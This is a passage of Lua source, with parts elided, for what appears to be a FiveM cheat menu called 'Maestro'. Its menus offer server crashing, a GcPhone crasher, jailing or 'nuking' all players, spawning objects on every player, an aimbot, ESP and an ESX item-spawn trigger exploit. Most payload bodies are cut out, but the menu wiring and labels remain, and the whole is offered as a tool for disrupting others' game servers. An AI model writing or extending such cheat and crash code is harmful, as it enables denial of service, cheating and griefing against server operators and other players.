                        name = item, db_name = CustomItemsDB, time = 100, max = 100, add = 10, remove = 10, drop = 100,
                        requires = ItemRequired and CustomItems.ItemDatabase[ItemRequired] or "nothing",
                        requires_name = ItemRequired and ItemRequired or "Nothing"
                    }
                }
                Citizen.CreateThread(function()
        ...
        TriggerOptionsMenu:AddItem(ESXSpawnCustomItem)
        FiveM.SetResourceLocked('esx_jobs', ESXSpawnCustomItem)
    end

    local function TrollOptionsMenu(menu)
        local TrollOptionsMenu = (MaestroEraPool:AddSubMenu(menu, "Troll Options"))
        TrollOptionsMenu.Item:RightLabel("->")
        TrollOptionsMenu = TrollOptionsMenu.SubMenu

        local BlockLegion = NativeUI.CreateItem("Block Legion", "Add Walls To Block")
                BlockLegion.Activated = function(ParentMenu, SelectedItem)
                    ...
                    TrollOptionsMenu:AddItem(BlockLegion)

                    local BlockCD = NativeUI.CreateItem("Block Simeons", "Add Walls To Block")
                    ...
                    TrollOptionsMenu:AddItem(BlockCD)

                    local BlockPD = NativeUI.CreateItem("Block Police Department", "Add Walls To Block")
                    ...
                    TrollOptionsMenu:AddItem(BlockPD)

		local Nuke = NativeUI.CreateCheckboxItem("Nuke all players", Enable_Nuke, "Drops the M.O.A.B. but on players")
        Nuke.CheckboxEvent = function(menu, item, enabled) Enable_Nuke = enabled end
        TrollOptionsMenu:AddItem(Nuke)

        local Crash = NativeUI.CreateCheckboxItem("Crash Server", Enable_ServerCrash, "Imma end this man's server")
        Crash.CheckboxEvent = function(menu, item, enabled) Enable_ServerCrash = enabled end
        TrollOptionsMenu:AddItem(Crash)

        local GcPhone = NativeUI.CreateCheckboxItem("GcPhone Crasher", Enable_GcPhone, "Imma gonna to destroy this shit")
        GcPhone.CheckboxEvent = function(menu, item, enabled) Enable_GcPhone = enabled end
        TrollOptionsMenu:AddItem(GcPhone)

        local Jail = NativeUI.CreateCheckboxItem("Jail Server", Enable_Jail, "Imma jail this mans")
        Jail.CheckboxEvent = function(menu, item, enabled) Enable_Jail = enabled end
        TrollOptionsMenu:AddItem(Jail)

        local BottlePlayer = NativeUI.CreateItem("Bottle All Players", "Giant Water Bottle")
            BottlePlayer.Activated = function(ParentMenu, SelectedItem)
                for i = 0, 128 do
            ...
            TrollOptionsMenu:AddItem(BottlePlayer)

                local WindMillPlayer = NativeUI.CreateItem("Windmill All Players", "Weird Windmill")
                WindMillPlayer.Activated = function(ParentMenu, SelectedItem)
                    for i = 0, 128 do
                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                ...
                TrollOptionsMenu:AddItem(WindMillPlayer)

                local UfoPlayer = NativeUI.CreateItem("Ufo Players", "Space Came To Earth")
                UfoPlayer.Activated = function(ParentMenu, SelectedItem)
                    for i = 0, 128 do
                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                ...
                TrollOptionsMenu:AddItem(UfoPlayer)

                local WeedPlayer = NativeUI.CreateItem("Weed Players", "Now You Just Need To Light Them Up")
                WeedPlayer.Activated = function(ParentMenu, SelectedItem)
                    for i = 0, 128 do
                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                ...
                TrollOptionsMenu:AddItem(WeedPlayer)

            local NakedPlayer = NativeUI.CreateItem("Spawn a naked guy on everyone", "He is goin to die")
            NakedPlayer.Activated = function(ParentMenu, SelectedItem)
                for i = 0, 128 do
                    if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                        local eb = 'a_m_m_acult_01'
                        local ec = GetHashKey(eb)
                        while not HasModelLoaded(ec) do
                            Citizen.Wait(0)
                            RequestModel(ec)
            ...
            TrollOptionsMenu:AddItem(NakedPlayer)
        end
            

    local function AddWorldOptionsMenu(menu)
        local WorldOptionsMenu = (MaestroEraPool:AddSubMenu(menu, "Maestro Ware"))
        WorldOptionsMenu.Item:RightLabel("->")
        WorldOptionsMenu = WorldOptionsMenu.SubMenu

        local ESPOptionsMenu = (MaestroEraPool:AddSubMenu(WorldOptionsMenu, "ESP + MORE"))
        ...
        do
            ...
            ESPOptionsMenu:AddItem(heatVision)
            ...
            ESPOptionsMenu:AddItem(nightVision)
        end

        local radar = NativeUI.CreateCheckboxItem("Radar", ShowExtendedRadar, "Make the radar bigger")
        radar.CheckboxEvent = function(menu, item, enabled) ShowExtendedRadar = enabled end
        WorldOptionsMenu:AddItem(radar)

        local playerBlips = NativeUI.CreateCheckboxItem("Player Blips", ShowPlayerBlips, "Show Player Blips")
        playerBlips.CheckboxEvent = function(menu, item, enabled) ShowPlayerBlips = enabled end
        WorldOptionsMenu:AddItem(playerBlips)

        local crosshair = NativeUI.CreateCheckboxItem("Crosshair", ShowCrosshair, "Enable Crosshair")
        crosshair.CheckboxEvent = function(menu, item, enabled) ShowCrosshair = enabled end
        WorldOptionsMenu:AddItem(crosshair)

		local crosshair2 = NativeUI.CreateCheckboxItem("Custom Crosshair", ShowCrosshair1, "This will always work ;)")
        crosshair2.CheckboxEvent = function(menu, item, enabled) ShowCrosshair1 = enabled end
        WorldOptionsMenu:AddItem(crosshair2)

		local aimbot = NativeUI.CreateCheckboxItem("Aimbot (POTENT)", Enable_Aimbot, "Turn On Aimbot")
        aimbot.CheckboxEvent = function(menu, item, enabled) Enable_Aimbot = enabled end
        WorldOptionsMenu:AddItem(aimbot)
    end


    local function AddSuicideMenu(menu)
        local SettingOptionsMenu = (MaestroEraPool:AddSubMenu(menu, "Credits + Purge Menu"))
        SettingOptionsMenu.Item:RightLabel("->")
        SettingOptionsMenu = SettingOptionsMenu.SubMenu
        local disable = NativeUI.CreateItem("Allah#99", "Maestro Dev")
        disable.Activated = function(ParentMenu, SelectedItem) ShowMenu = false end
        SettingOptionsMenu:AddItem(disable)
        local disable = NativeUI.CreateItem("Muhammad#1", "Maestro Dev")
		disable:RightLabel("🐱")
        disable.Activated = function(ParentMenu, SelectedItem) ShowMenu = false end
        SettingOptionsMenu:AddItem(disable)
        local disable = NativeUI.CreateItem("bruhhhhhhhhhh", "Love you guys")
        disable.Activated = function(ParentMenu, SelectedItem) ShowMenu = false end
        SettingOptionsMenu:AddItem(disable)
    end

    AddPlayerOptionsMenu(MaestroEra)
    AddOnlinePlayersMenu(MaestroEra)
    AddTeleportMenu(MaestroEra)
    AddWeaponOptionsMenu(MaestroEra)
    AddVehicleOptionsMenu(MaestroEra)
    AddTriggerOptionsMenu(MaestroEra)
    AddHarvestMenu(MaestroEra)
    TrollOptionsMenu(MaestroEra)
    AddWorldOptionsMenu(MaestroEra)
    AddSuicideMenu(MaestroEra)
end


MaestroEraPool:MouseControlsEnabled(false)
MaestroEraPool:MouseEdgeEnabled(false)
MaestroEraPool:ControlDisablingEnabled(false)

MaestroEraPool:RefreshIndex()

Citizen.CreateThread(function()
    while ShowMenu do
        MaestroEraPool:ProcessMenus()
        if IsDisabledControlJustPressed(0, 107) then
            MaestroEraPool:RefreshIndex()
            if MaestroEraPool:IsAnyMenuOpen() then
                MaestroEraPool:CloseAllMenus()
            else
                MaestroEra:Visible(true)
            end
        end
        Citizen.Wait(0)
    end
    ...
    RegisterCommand("FunCtionOk", function(source, args, raw) ShowMenu = false end, false)
